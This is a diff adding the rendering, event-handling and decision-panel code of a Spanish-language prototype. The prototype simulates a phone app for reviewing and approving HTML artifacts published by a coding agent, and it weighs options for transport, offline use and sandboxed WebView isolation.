+  d: { entry: 'workspace', view: 'webview', off: 'cache', approved: 'collapsed', iso: 'layers', verdict: 'both' },
+  opened: new Set(), waiting: {}, newCount: 0, log: [],
+};
+const KIND = { prototype: 'prototipo', document: 'documento', report: 'informe', spec: 'spec' };
+const ago = at => { const m = Math.max(0, store.now - at); return m === 0 ? 'ahora' : 'hace ' + m + ' min'; };
+const itemById = id => store.items.find(i => i.id === id);
+
+// ---- terminal of the agent
+function say(cls, s) { S.log.push('<span class="' + cls + '">' + esc(s) + '</span>'); renderTerm(); }
+function renderTerm() { const t = $('#term'); t.innerHTML = S.log.join('\n') || '<span class="d">(el agente todavía no publicó nada)</span>'; t.parentElement.scrollTop = 1e9; }
+
+function agentPublish(ws, name, title, kind, html, file) {
+  const wait = S.wait;
+  say('p', '$ jw artifact publish ' + file + ' --name ' + name + ' --kind ' + kind + (wait ? ' --wait' : ''));
+  const r = publish(store, { ws, name, title, kind, html, pane: 'p3' });
+  if (!r.ok) {
+    say('e', 'error: ' + kib(r.size) + ' supera el máximo de ' + kib(r.limit) + ' (un mensaje del enlace es de hasta 1 MiB). Inserta los recursos o divide el artefacto.');
+    return;
+  }
+  say('d', 'publicado ' + r.item.id + ' v' + r.version.n + ' (' + r.version.hash + ', ' + kib(r.version.size) + ') · el teléfono lo ve como «por revisar»');
+  if (wait) { S.waiting[r.item.id + '@' + r.version.n] = true; say('d', 'esperando el veredicto… (Ctrl-C para dejar de esperar)'); }
+  render();
+}
+
+// ---- the phone, drawn with the classes of mobile.html
+const I = {
+  back: '<path d="M15 5l-7 7 7 7"/>', plus: '<path d="M12 5v14M5 12h14"/>', search: '<circle cx="11" cy="11" r="6"/><path d="M20 20l-4-4"/>',
+  bell: '<path d="M6 16v-5a6 6 0 0 1 12 0v5l1.5 2h-15z"/><path d="M10 21h4"/>',
+  gear: '<circle cx="12" cy="12" r="3"/><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/>',
+  more: '<circle cx="12" cy="5" r="1"/><circle cx="12" cy="12" r="1"/><circle cx="12" cy="19" r="1"/>',
+  folder: '<path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>',
+};
+const ic = n => '<svg class="i" viewBox="0 0 24 24" aria-hidden="true">' + I[n] + '</svg>';
+const PATH = { a: '~/ws/jw-wt/phone-artifacts', b: '~/ws/jw-wt/ask-other', c: '~/ws/api-wt/billing' };
+const wsKey = w => Object.keys(WS).find(k => WS[k] === w);
+const pendingOf = w => store.items.filter(i => i.ws === w && status(i) === 'pending').length;
+const branchOf = w => w.split(' · ')[1], repoOf = w => w.split(' · ')[0], nameOf = w => branchOf(w).replace(/^feat\//, '');
+const route = () => S.link === 'tunnel' ? 'túnel' : S.link === 'lan' ? 'wifi' : 'apagado';
+const tag = s => s === 'pending' ? '<span class="tg y">por revisar</span>' : s === 'approved' ? '<span class="tg on">aprobado</span>' : '<span class="tg m">cambios pedidos</span>';
+const plural = n => n + ' artefacto' + (n > 1 ? 's' : '') + ' por revisar';
+function statusBar(mode, hint, tone) {
+  return '<div class="status"><span class="chip" style="--c:' + tone + '">' + mode + '</span><span class="hint">' + hint + '</span>'
+    + (S.link === 'off' ? '<span class="msg">enlace apagado</span>' : '') + '<span class="route">' + route() + '</span></div>';
+}
+function offBanner() {
+  if (S.link !== 'off') return '';
+  if (S.d.off === 'cache') return '<div class="ban"><b>enlace apagado</b> copia de hace ' + Math.max(1, store.now) + ' min · solo lectura · enciéndelo en jw</div>';
+  if (S.d.off === 'queue') return '<div class="ban"><b>enlace apagado</b> lo que decidas se manda al encender</div>';
+  return '';
+}
+
+function wsRows(k) {
+  const w = WS[k], p = pendingOf(w);
+  return '<button class="row wt" data-act="openWs" data-ws="' + esc(w) + '"><span class="o" style="color:var(--green)">●</span><span class="nm"><b>' + esc(nameOf(w)) + '</b><span>⎇ ' + esc(branchOf(w)) + '</span>'
+    + (p ? '<span class="at">▣ artefacto por revisar</span>' : '') + '</span><span class="mk">' + (p ? '<span class="ar">▣</span>' : '') + '</span></button>';
+}
+function home() {
+  const n = pendingCount(store);
+  const root = (name, path) => '<div class="row root" style="cursor:default"><span class="o" style="color:var(--green)">●</span><span class="nm"><b>' + name + '</b><span>' + path + '</span></span></div>';
+  const global = S.d.entry === 'global'
+    ? '<div class="sec">artefactos</div><button class="row root" data-act="listAll"><span class="o" style="color:var(--cyan)">▣</span><span class="nm"><b>Artefactos · todos</b><span>' + (n ? plural(n) : 'nada por revisar') + '</span></span></button>' : '';
+  return '<div class="hdr"><div class="t"><b>jw · casa</b><span>mi-mac · ' + route() + '</span></div>'
+    + '<button class="ib" aria-label="Buscar workspace">' + ic('search') + '</button><button class="ib" aria-label="Workspace nuevo">' + ic('plus') + '</button>'
+    + '<button class="ib" data-act="inbox" aria-label="Avisos' + (n ? ': ' + n + ' esperando' : '') + '">' + ic('bell') + (n ? '<span class="bdg">' + n + '</span>' : '') + '</button>'
+    + '<button class="ib" aria-label="Ajustes">' + ic('gear') + '</button></div>'
+    + '<div class="scroll">' + global + '<div class="sec">workspaces · 5</div>'
+    + root('jw', '~/ws/jw') + wsRows('a') + wsRows('b') + root('api', '~/ws/api') + wsRows('c')
+    + '<div class="legend" style="padding:14px;color:var(--dim);font-size:11.5px"><span style="color:var(--cyan)">▣</span> artefacto por revisar</div></div>'
+    + statusBar('NORMAL', 'toca una fila', 'var(--blue)');
+}
+
+function inbox() {
+  const w = store.items.filter(i => status(i) === 'pending').sort((a, b) => latest(b).at - latest(a).at);
+  return '<div class="hdr"><button class="ib" data-act="goHome" aria-label="Volver a workspaces">' + ic('back') + '</button><div class="t"><b>avisos</b><span>lo que espera algo de ti</span></div></div>'
+    + '<div class="scroll">' + (w.length ? w.map(it => '<button class="inb" data-act="open" data-id="' + it.id + '" data-from="inbox"><div class="h"><span class="mk"><span class="ar">▣</span></span><b>' + esc(repoOf(it.ws)) + '/' + esc(nameOf(it.ws)) + '</b><span class="ago">' + ago(latest(it).at) + '</span></div>'
+      + '<span class="tx">' + esc(it.title) + ' · v' + latest(it).n + ' por revisar</span></button>').join('')
+      : '<div style="padding:40px 20px;text-align:center;color:var(--dim)">Nada espera. Cuando algo termine o pregunte, aparece aquí.</div>') + '</div>'
+    + statusBar('?', w.length + ' esperando', 'var(--yellow)');
+}
+
+function itemRows(g) {
+  const rows = it => { const v = latest(it); return '<button class="fe" data-act="open" data-id="' + it.id + '" data-from="' + (S.screen === 'list' ? 'all' : 'arts') + '"><span class="g">▣</span><span class="nm"><b>' + esc(it.title) + '</b><span>v' + v.n + ' · ' + KIND[it.kind] + ' · ' + kib(v.size) + ' · ' + ago(v.at) + '</span></span>' + tag(status(it)) + '</button>'; };
+  let out = g.pending.map(rows).join('');
+  if (g.decided.length && S.d.approved === 'collapsed') {
+    const open = S.showDecided[g.ws];
+    out += '<button class="sec" data-act="toggleDecided" data-ws="' + esc(g.ws) + '">' + (open ? '▾' : '▸') + ' ya decididos · ' + g.decided.length + '</button>';
+    if (open) out += g.decided.map(rows).join('');
+  }
+  return out;
+}
+function artList(ws) {
+  if (S.link === 'off' && S.d.off === 'nothing') return '<div class="centre"><span class="big">enlace apagado</span>el teléfono no puede ver artefactos. Enciende el enlace del teléfono en jw.</div>';
+  const g = groups(store).find(x => x.ws === ws);
+  const body = g ? itemRows(g) : '';
+  return offBanner() + (body ? '<div class="scroll">' + body + '</div>' : '<div class="centre"><span class="big">nada que revisar</span>cuando el agente de este workspace publique un artefacto, aparece aquí.</div>');
+}
+
+function wsMenu() {
+  const p = pendingOf(S.ws);
+  const it = (g, label, extra, hot) => '<button data-act="menuItem" data-item="' + label + '"' + (hot ? ' class="hot"' : '') + '>' + g + '<span class="l">' + label + '</span>' + (extra || '') + '</button>';
+  return '<div class="shade" data-act="menu"></div><div class="menu" role="menu">'
+    + it(ic('search'), 'cambiar workspace')
+    + it(ic('folder'), 'archivos')
+    + it('<span class="pm">±</span>', 'cambios')
+    + it('<span class="pm">▣</span>', 'artefactos', p ? '<span class="tg y">' + p + '</span>' : '', true) + '</div>';
+}
+function wsScreen() {
+  const w = S.ws, k = wsKey(w), p = pendingOf(w), tab = S.tab;
+  const pt = (id, label, c) => '<button class="pt" role="tab" aria-selected="' + (tab === id) + '" data-act="tab" data-tab="' + id + '" style="--c:' + c + '"><i></i>' + label + '</button>';
+  return '<div class="hdr"><button class="ib" data-act="goHome" aria-label="Volver a workspaces">' + ic('back') + '</button>'
+    + '<div class="t"><b>' + esc(repoOf(w)) + ' › ' + esc(nameOf(w)) + '</b><span>⎇ ' + esc(branchOf(w)) + ' · base main · ' + PATH[k] + '</span></div>'
+    + '<button class="ib" data-act="menu" aria-label="Menú del workspace' + (p ? ': ' + p + ' artefactos por revisar' : '') + '" aria-expanded="' + !!S.menu + '">' + ic('more') + (p ? '<span class="bdg">' + p + '</span>' : '') + '</button></div>'
+    + '<div class="panes" role="tablist">' + pt('claude', 'claude', 'var(--magenta)') + pt('shell', 'shell', 'var(--dim)')
+    + '<button class="pt add" aria-label="Panel nuevo">' + ic('plus') + '</button></div>'
+    + '<div class="out">(los paneles del workspace no cambian en esta parte)</div>'
+    + statusBar('TERM', tab + ' · texto', 'var(--green)') + (S.menu ? wsMenu() : '');
+}
+
+function arts() { // this workspace's artifacts: a screen of its own, reached from the header menu
+  const w = S.ws, p = pendingOf(w);
+  return '<div class="hdr"><button class="ib" data-act="backWs" aria-label="Volver al workspace">' + ic('back') + '</button><div class="t"><b>artefactos</b><span>' + esc(repoOf(w)) + ' › ' + esc(nameOf(w)) + ' · ' + (p ? plural(p) : 'nada por revisar') + '</span></div></div>'
+    + artList(w) + statusBar('ARTE', p ? plural(p) : 'nada por revisar', 'var(--cyan)');
+}
+
+function list() { // the global list, only when the decision asks for it
+  const gs = groups(store);
+  const body = gs.map(g => '<div class="sec">' + esc(g.ws) + ' · ' + g.pending.length + '</div>' + itemRows(g)).join('');
+  return '<div class="hdr"><button class="ib" data-act="goHome" aria-label="Volver">' + ic('back') + '</button><div class="t"><b>artefactos · todos</b><span>' + plural(pendingCount(store)) + '</span></div></div>'
+    + offBanner() + '<div class="scroll">' + (body || '<div class="centre"><span class="big">nada que revisar</span></div>') + '</div>'
+    + statusBar('ARTE', pendingCount(store) + ' por revisar', 'var(--cyan)');
+}
+
+const frames = {};
+function frameFor(it, v) {
+  const key = it.id + '@' + v.n + '@' + S.d.iso;
+  if (frames[key]) return frames[key];
+  const fr = document.createElement('iframe');
+  fr.className = 'frame';
+  fr.title = it.title;
+  // The outer frame is the WebView: its own origin, never the app's (the prototype page plays the app).
+  fr.setAttribute('sandbox', 'allow-scripts');
+  fr.srcdoc = shell(v.html, S.d.iso);
+  return (frames[key] = fr);
+}
+
+function art() {
+  const it = itemById(S.artId); const v = it.versions[S.ver - 1]; const lt = latest(it);
+  const key = it.id + '@' + v.n;
+  const canSee = S.link !== 'off' || (S.d.off !== 'nothing' && S.opened.has(key));
+  if (S.link !== 'off') S.opened.add(key);
+  const iso = S.d.iso === 'layers' ? '<b class="g">aislado</b> sin red · sin acceso a jw'
+    : S.d.iso === 'csp' ? '<b>solo CSP</b> sin sandbox' : '<b>sin scripts</b> documento estático';
+  let h = '<div class="hdr"><button class="ib" data-act="back" aria-label="Volver">' + ic('back') + '</button><div class="t"><b>' + esc(it.title) + '</b><span>' + esc(repoOf(it.ws)) + ' › ' + esc(nameOf(it.ws)) + ' · ' + KIND[it.kind] + '</span></div>'
+    + '<button class="ib" data-act="versions" aria-label="Versiones" style="width:auto;padding:0 10px;font-size:12px">v' + v.n + ' ▾</button></div>';
+  if (S.d.view === 'browser') h += '<div class="ban"><b class="r">navegador</b> https://wet-pine-12.trycloudflare.com/a/' + v.hash + '?t=3fa9c1e07b… · el token va en la URL</div>';
+  else h += '<div class="ban">' + iso + '</div>';
+  h += offBanner();
+  h += '<div class="slot" id="slot">' + (canSee ? '' : '<div class="centre"><span class="big">sin copia</span>este artefacto no se abrió con el enlace encendido.</div>') + '</div>';
+  h += actBar(it, v, lt);
+  h += statusBar('ARTE', 'v' + v.n + ' · ' + v.hash + ' · ' + KIND[it.kind], 'var(--cyan)');
+  if (S.sheet === 'changes') h += changesSheet(it, v);
+  if (S.sheet === 'versions') h += versionsSheet(it, v);
+  return h;
+}
+
+function actBar(it, v, lt) {
+  const vd = v.verdict;
+  const dock = (p, inner) => '<div class="dock"><div class="p">' + p + '</div>' + inner + '</div>';
+  if (v.n !== lt.n) return dock('<span>estás viendo v' + v.n + '</span>', '<div class="yn"><button class="y" data-act="ver" data-n="' + lt.n + '">hay una versión nueva (v' + lt.n + ') · verla</button></div>');
+  if (vd) {
+    const note = vd.delivered === 'agent' ? 'enviado al agente (p3)' : vd.delivered === 'mark' ? 'solo marcado, el agente no recibe nada' : 'guardado: ese agente ya cerró';
+    return dock('<span>v' + v.n + ' · ' + v.hash + '</span><span>' + note + '</span>', '<div class="done ' + (vd.type === 'approved' ? 'y' : 'c') + '">' + (vd.type === 'approved' ? '✓ aprobado' : '↺ cambios pedidos') + '</div>' + (vd.text ? '<div class="p">«' + esc(vd.text) + '»</div>' : ''));
+  }
+  const q = S.queued && S.queued.find(x => x.id === it.id);
+  if (q) return dock('<span>v' + v.n + ' · ' + v.hash + '</span><span>en cola</span>', '<div class="done q">en cola: ' + (q.type === 'approved' ? 'aprobar' : 'pedir cambios') + ' · se manda al encender</div>');
+  if (S.link === 'off' && S.d.off !== 'queue') return dock('<span>v' + v.n + ' · ' + v.hash + ' · por revisar</span><span>enlace apagado</span>', '<div class="yn"><button class="c" disabled>pedir cambios</button><button class="y" disabled>aprobar</button></div>');
+  if (S.confirm) return dock('<span>¿aprobar v' + v.n + ' (' + v.hash + ')?</span><span>el agente seguirá</span>', '<div class="yn"><button class="n" data-act="cancelOk">cancelar</button><button class="y" data-act="approve">sí, aprobar</button></div>');
+  return dock('<span>v' + v.n + ' · ' + v.hash + ' · por revisar</span><span>→ claude (p3)</span>', '<div class="yn"><button class="c" data-act="changes">pedir cambios</button><button class="y" data-act="confirmOk">aprobar</button></div>');
+}
+function changesSheet(it, v) {
+  return '<div class="back" data-act="closeSheet"></div><div class="sheet"><div class="grab"></div><h3>pedir cambios · v' + v.n + ' · va a claude</h3>'
+    + '<textarea id="draft" placeholder="qué hay que cambiar…" aria-label="Qué hay que cambiar">' + esc(S.draft) + '</textarea>'
+    + '<div class="yn"><button class="n" data-act="closeSheet">cancelar</button><button id="send" class="c" data-act="sendChanges"' + (S.draft.trim() ? '' : ' disabled') + '>enviar a claude</button></div></div>';
+}
+function versionsSheet(it, cur) {
+  return '<div class="back" data-act="closeSheet"></div><div class="sheet"><div class="grab"></div><h3>versiones</h3><div style="overflow:auto">'
+    + it.versions.slice().reverse().map(x => '<button class="lk" data-act="ver" data-n="' + x.n + '"' + (x.n === cur.n ? ' aria-current="true"' : '') + '><kbd>v' + x.n + '</kbd><span>' + x.hash + '</span><em>' + ago(x.at) + ' · ' + (x.verdict ? (x.verdict.type === 'approved' ? 'aprobado' : 'cambios') : 'por revisar') + '</em></button>').join('') + '</div></div>';
+}
+
+function render() {
+  const ph = $('#ph');
+  ph.innerHTML = S.screen === 'home' ? home() : S.screen === 'inbox' ? inbox() : S.screen === 'ws' ? wsScreen() : S.screen === 'arts' ? arts() : S.screen === 'list' ? list() : art();
+  if (S.screen === 'art') {
+    const slot = $('#slot'); const it = itemById(S.artId); const v = it.versions[S.ver - 1];
+    const cached = S.opened.has(it.id + '@' + v.n);
+    if (slot && (S.link !== 'off' || (S.d.off !== 'nothing' && cached))) slot.appendChild(frameFor(it, v));
+  }
+  document.querySelectorAll('[data-link]').forEach(b => b.setAttribute('aria-pressed', String(b.dataset.link === S.link)));
+  $('#phHint').textContent = S.screen === 'art' ? 'La barra de abajo es de la app, fuera del WebView: el artefacto no puede dibujarla ni pulsarla.' : '';
+}
+
+function doDecide(type, text) {
+  const it = itemById(S.artId); const v = latest(it);
+  if (S.link === 'off' && S.d.off === 'queue') {
+    (S.queued = S.queued || []).push({ id: it.id, n: v.n, hash: v.hash, type, text });
+    S.sheet = null; S.confirm = false; render(); return;
+  }
+  const r = decide(store, { id: it.id, n: v.n, hash: v.hash, type, text, link: S.link, agentAlive: S.agentAlive, approveToAgent: S.d.verdict === 'both' });
+  S.sheet = null; S.confirm = false; S.draft = '';
+  if (!r.ok) { say('e', '[teléfono] veredicto rechazado: ' + r.why); render(); return; }
+  deliver(r);
+  render();
+}
+function deliver(r) {
+  const key = r.item.id + '@' + r.version.n;
+  if (r.msg) {
+    say('a', 'claude ← ' + r.msg);
+  } else if (r.delivered === 'none') {
+    say('d', '[jw] veredicto guardado: el agente que publicó ya cerró. No se reenvía solo; `jw artifact ls` lo muestra.');
+  } else if (r.delivered === 'mark') {
+    say('d', '[jw] aprobado y marcado; el agente no recibe nada (se lee con `jw artifact ls`).');
+  }
+  if (S.waiting[key] && r.delivered !== 'none') {
+    delete S.waiting[key];
+    const t = r.version.verdict;
+    say('p', t.type === 'approved' ? '→ approved  (exit 0)' : '→ changes  (exit 4)\n' + t.text);
+  }
+}
+function flushQueue() {
+  const q = S.queued || []; S.queued = [];
+  for (const x of q) {
+    const r = decide(store, { id: x.id, n: x.n, hash: x.hash, type: x.type, text: x.text, link: S.link, agentAlive: S.agentAlive, approveToAgent: S.d.verdict === 'both' });
+    if (r.ok) deliver(r); else say('e', '[teléfono] veredicto en cola descartado (' + r.why + '): había una versión nueva.');
+  }
+}
+
+document.addEventListener('click', e => {
+  const b = e.target.closest('[data-act],[data-link],[data-ag]'); if (!b) return;
+  if (b.dataset.link) { S.link = b.dataset.link; if (S.link !== 'off') flushQueue(); render(); return; }
+  if (b.dataset.ag) { agent(b.dataset.ag); return; }
+  const a = b.dataset.act;
+  if (a === 'goHome') { S.screen = 'home'; S.sheet = null; S.menu = false; }
+  else if (a === 'openWs') { S.ws = b.dataset.ws; S.tab = 'claude'; S.screen = 'ws'; S.menu = false; }
+  else if (a === 'menu') S.menu = !S.menu;
+  else if (a === 'menuItem') { S.menu = false; if (b.dataset.item === 'artefactos') S.screen = 'arts'; }
+  else if (a === 'backWs') S.screen = 'ws';
+  else if (a === 'tab') S.tab = b.dataset.tab;
+  else if (a === 'inbox') S.screen = 'inbox';
+  else if (a === 'listAll') S.screen = 'list';
+  else if (a === 'back') { S.screen = S.from === 'inbox' ? 'inbox' : S.from === 'all' ? 'list' : 'arts'; S.sheet = null; S.confirm = false; }
+  else if (a === 'open') { const it = itemById(b.dataset.id); S.from = b.dataset.from; S.ws = it.ws; S.screen = 'art'; S.artId = it.id; S.ver = latest(it).n; S.confirm = false; S.sheet = null; }
+  else if (a === 'toggleDecided') S.showDecided[b.dataset.ws] = !S.showDecided[b.dataset.ws];
+  else if (a === 'versions') S.sheet = 'versions';
+  else if (a === 'ver') { S.ver = +b.dataset.n; S.sheet = null; }
+  else if (a === 'closeSheet') S.sheet = null;
+  else if (a === 'changes') { S.sheet = 'changes'; }
+  else if (a === 'confirmOk') S.confirm = true;
+  else if (a === 'cancelOk') S.confirm = false;
+  else if (a === 'approve') { doDecide('approved', ''); return; }
+  else if (a === 'sendChanges') { doDecide('changes', S.draft); return; }
+  render();
+  if (a === 'changes') { const d = $('#draft'); if (d) d.focus(); }
+});
+document.addEventListener('input', e => {
+  if (e.target.id === 'draft') { S.draft = e.target.value; const s = $('#send'); if (s) s.disabled = !S.draft.trim(); }
+});
+$('#wait').addEventListener('change', e => { S.wait = e.target.checked; });
+$('#gone').addEventListener('change', e => { S.agentAlive = !e.target.checked; say('d', S.agentAlive ? '(el agente volvió)' : '(el agente cerró su pane)'); });
+
+function agent(k) {
+  if (k === 'v2') agentPublish(WS.a, 'informe', 'Informe de rendimiento', 'report', A_REPORT.replace('un solo cambio', 'un solo cambio (v2: con el caso de memoria)'), 'informe.html');
+  else if (k === 'new') {
+    const n = ++S.newCount;
+    agentPublish(WS.a, 'mockup-' + n, 'Mockup de ajustes ' + n, 'prototype', A_PROTO.replace('propuesta B', 'propuesta ' + String.fromCharCode(66 + n)), 'mockup-' + n + '.html');
+  }
+  else if (k === 'big') agentPublish(WS.a, 'grande', 'Captura enorme', 'document', '<!doctype html><p>' + 'x'.repeat(3 * 1024 * 1024), 'grande.html');
+  else if (k === 'evil') agentPublish(WS.a, 'hostil', 'Prueba de aislamiento (hostil)', 'prototype', A_EVIL, 'hostil.html');
+}
+
+// ---- the decisions
+const Q = [
+  { k: 'entry', title: '0 · Dónde se entra a los artefactos', live: true, opts: [
+    ['rec', 'Una opción «artefactos» en el menú de la cabecera del workspace, y un aviso como el resto de la atención', 'La cabecera del workspace deja de tener tres iconos sueltos (buscar, archivos, cambios) y pasa a un botón <b>⋮</b> que abre un menú de cuatro opciones: cambiar workspace, archivos, cambios y artefactos. El botón lleva la marca de pendientes. «Artefactos» abre la lista de ese workspace. Que algo espera revisión se avisa como lo demás: una línea de color en la fila del workspace, el número en la campana y una fila en «avisos». <b>Ojo:</b> esto cambia la cabecera que ya existe en <code>mobile.html</code> y en la app (<code>Screens.kt</code>), no solo añade algo.'],
+    ['', 'Además, una pantalla «Artefactos · todos» en Inicio', 'Útil para aprobar de corrido varios workspaces, pero es una pantalla más y repite lo que ya dicen los avisos. Se puede añadir después.'],
+  ], key: 'entry', vals: ['workspace', 'global'] },
+  { k: 'port', title: '1 · Qué es «levantar puertos» aquí', live: false, opts: [
+    ['rec', 'Ningún puerto nuevo: los bytes viajan por el canal que ya existe', 'El HTML va como texto en un mensaje del WebSocket autenticado, por la red local o por el túnel. Se apaga con el enlace (REQ-190) y no hay nada que proteger fuera del puente. Es lo que pides —exponerlo por el wifi o el túnel y poder habilitar el acceso— sin un servidor.'],
+    ['', 'Un puerto interno (HTTP) por artefacto, expuesto por el wifi o el túnel', 'Es lo más literal. Pero el puente rechaza cualquier <code>Origin</code> (REQ-72) y habla solo WebSocket; habría que abrir una segunda superficie autenticada, y la autenticación acabaría en un token en la URL, que ya se probó y se descartó como peor.'],
+  ]},
+  { k: 'what', title: '2 · Qué cuenta como artefacto y cómo se publica', live: false, opts: [
+    ['rec', 'Un archivo: HTML autocontenido o Markdown, hasta 512 KiB, publicado con <code>jw artifact publish</code>', 'El daemon guarda una <b>copia inmutable por versión</b> en su estado, no en el repo. Mismo <code>--name</code> en el mismo worktree = versión nueva, que vuelve a «por revisar». Un <code>.md</code> no necesita WebView: va por el visor de Markdown que ya existe (sin JavaScript, sin riesgo); solo el HTML usa la vista aislada.'],
+    ['', 'Una carpeta con recursos', 'No exige HTTP: el WebView puede interceptar cada ruta relativa y pedir el archivo por el WebSocket. Lo que cuesta es el tamaño y la superficie de aislamiento (más rutas, más tipos de archivo, más que vigilar). Buena v2.'],
+    ['', 'Una referencia a un archivo del worktree, sin copiar', 'Lo que apruebas puede cambiar debajo, sin que lo sepas: rompe la regla de que el veredicto va atado a una versión y a su hash.'],
+  ]},
+  { k: 'view', title: '3 · Dónde lo ve el teléfono', live: true, opts: [
+    ['rec', 'En una vista web dentro de la app', 'Los bytes llegan por el WebSocket y se pintan en un WebView que la app controla (sin red, sin puente a Kotlin). La barra de aprobar es nativa. Ningún token en una URL.'],
+    ['', 'En el navegador del teléfono, por una URL', 'Necesita el servicio HTTP de la decisión 1; el token va en la URL, queda en el historial y el HTML corre fuera de la app. Míralo en el teléfono de la izquierda.'],
+  ], key: 'view', vals: ['webview', 'browser'] },
+  { k: 'off', title: '4 · Qué ve el usuario con el enlace apagado', live: true, opts: [
+    ['rec', 'La lista y lo ya abierto, de la copia, solo lectura; los botones desactivados', 'Sin veredicto a ciegas: aprobar algo que quizá ya cambió es lo que más cuesta deshacer. El aviso dice cómo encender el enlace. Al revocar el dispositivo, la app borra la copia.'],
+    ['', 'Nada: «enlace apagado»', 'Más simple y más privado (no queda copia en el teléfono), pero no puedes releer un artefacto que ya viste.'],
+    ['', 'Como la primera, pero el veredicto queda en cola y se manda al encender', 'Cómodo, y arriesgado: el agente puede haber publicado otra versión; la cola tendría que descartarla (el prototipo lo hace). No lo recomiendo en la v1.'],
+  ], key: 'off', vals: ['cache', 'nothing', 'queue'] },
+  { k: 'approved', title: '5 · Qué pasa con un artefacto aprobado', live: true, opts: [
+    ['rec', 'Se queda en «Ya decididos», plegado, solo lectura', 'Se puede releer y ver sus versiones. Si el agente publica otra versión con el mismo nombre, vuelve a «por revisar». Se borra con el worktree o con <code>jw artifact rm</code>.'],
+    ['', 'Desaparece de la lista del teléfono', 'La lista queda limpia, pero no puedes consultar lo aprobado desde el teléfono; sigue en <code>jw artifact ls</code>.'],
+  ], key: 'approved', vals: ['collapsed', 'hidden'] },
+  { k: 'iso', title: '6 · Cómo se evita que su JavaScript toque el secreto o salga a la red', live: true, opts: [
+    ['rec', 'Capas: sin puente a Kotlin + sandbox + CSP puesta por la app + sin red', 'El WebSocket y el secreto viven en Kotlin; el WebView no tiene <code>addJavascriptInterface</code>, ni archivos, ni red, ni navegación: eso protege el secreto y el canal. La página va además en un <code>iframe</code> en sandbox (origen opaco, sin salir de la ventana) con una CSP que fija la app: <code>connect-src \'none\'</code>, <code>img-src data:</code>. Es el RISK a. Prueba con «el hostil».'],
+    ['', 'Solo la CSP, sin sandbox', 'Con las sondas de «el hostil», solo la CSP ya bloquea todo en esta imitación; la capa de sandbox añade defensa en profundidad (origen opaco, sin salir de la ventana) por un coste casi nulo. Sin ella, la CSP es la única barrera: si un WebView la aplica distinto, no queda otra. Hay que medirlo en el dispositivo.'],
+    ['', 'Sin JavaScript (solo documentos estáticos)', 'Aislamiento total y trivial, pero mata los prototipos interactivos, que es para lo que lo pides.'],
+  ], key: 'iso', vals: ['layers', 'csp', 'static'] },
+  { k: 'verdict', title: '7 · Qué hacen Aprobar y Pedir cambios, y a qué agente llegan', live: true, opts: [
+    ['rec', 'Los dos llegan al pane que publicó, como un prompt corto, por la misma ruta de <code>jw prompt</code>', 'Aprobar: una línea con título, versión y hash. Pedir cambios: lo mismo más tu texto. Si el comando esperaba con <code>--wait</code>, lo recibe como resultado (exit 0 o 4). Si ese pane ya no existe, el veredicto queda guardado y visible en <code>jw artifact ls</code>; no se reenvía a otro agente solo.'],
+    ['', 'Solo Pedir cambios llega al agente; Aprobar solo marca', 'El agente no se entera de la aprobación salvo que mire; depende de que consulte. Menos ruido, menos fiable.'],
+  ], key: 'verdict', vals: ['both', 'mark'] },
+];
+function buildDecide() {
+  $('#decide').innerHTML = Q.map(q => '<div class="q"><h3><span>' + (q.live ? '' : '') + '</span>' + q.title + (q.live ? ' <span class="live">● en vivo</span>' : '') + '</h3>'
+    + q.opts.map((o, i) => '<label class="opt ' + o[0] + '"><input type="radio" name="q_' + q.k + '" value="' + i + '"' + (i === 0 ? ' checked' : '') + '><span class="tx">' + (o[0] ? '<span class="tag">recomendado</span><br>' : '') + '<b>' + o[1] + '</b><br>' + o[2] + '</span></label>').join('') + '</div>').join('');
+  $('#decide').addEventListener('change', e => {
+    const m = /^q_(\w+)$/.exec(e.target.name || ''); if (!m) return;
+    const q = Q.find(x => x.k === m[1]); if (!q.key) return;
+    S.d[q.key] = q.vals[+e.target.value];
+    for (const k in frames) delete frames[k];
+    S.confirm = false; render();
+  });
+}
+
+buildDecide(); renderTerm(); render();
+say('d', '(el agente trabaja en feat/phone-artifacts; usa los botones de arriba para que publique)');
+})();
+</script>
+</body>
+</html>
